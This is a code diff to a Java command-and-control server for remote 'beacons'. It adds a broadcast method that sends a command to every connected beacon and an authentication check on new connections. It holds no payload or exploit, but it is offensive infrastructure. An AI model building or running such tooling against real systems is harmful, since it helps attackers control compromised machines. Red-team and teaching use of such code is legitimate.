@@ -10,7 +10,7 @@ import Servers.Duplexer;
 public class C2Server{
     // Dictionary of all of the longRangeBeacons currently reporting back to the C2
     // Formatted IP Address, Duplexer Pointer
-    private HashMap<String,Duplexer> longRangeBeacons;
+    private HashMap<String,C2ServerBeaconHandler> longRangeBeacons;
 
     // Bionded Server Socket
     private ServerSocket serverSocket;
@@ -35,8 +35,10 @@ public class C2Server{
      * 
      * @param command Command issued to the long range beacons.
      */
-    protected void broadcast(String command){
-
+    protected void broadcastToBeacons(String command){
+        for(C2ServerBeaconHandler beaconHandler : longRangeBeacons.values()){
+            beaconHandler.sendToBeacon(command);
+        }
     }
 
     /**
@@ -60,11 +62,25 @@ public class C2Server{
                 Duplexer duplexer = new Duplexer(socket);
                 // Get the IP address of the Duplexer
                 String IP = socket.getRemoteSocketAddress().toString();
-                // Store IP and Duplexer pointer in the dicitonary
-                longRangeBeacons.put(IP, duplexer);
-                // Start up a new thread to handle each Long Range Beacon
-                C2ServerBeaconHandler beaconHandler = new C2ServerBeaconHandler(duplexer, IP, this);
-                beaconHandler.run();
+                // Receive initial message for authentication from the new Beacon
+                String hashedPassForAuth = duplexer.receive();
+                // Pass this hash to the User Handler thread for MFA
+                String authResponse = userHandler.authenticateToC2(hashedPassForAuth, IP);
+                duplexer.send(authResponse);
+                if(!(authResponse.equals("Authentication Successful"))){
+                    duplexer.close();
+                }else{
+                    // Create a new thread to handle each Long Range Beacon
+                    C2ServerBeaconHandler beaconHandler = new C2ServerBeaconHandler(duplexer, IP, this);
+
+                    // Store IP and Duplexer pointer in the dicitonary
+                    longRangeBeacons.put(IP, beaconHandler);
+
+                    // Start the thread
+                    beaconHandler.run();
+                }
+                
+                
                 
             } catch(IOException e){
                 e.printStackTrace();
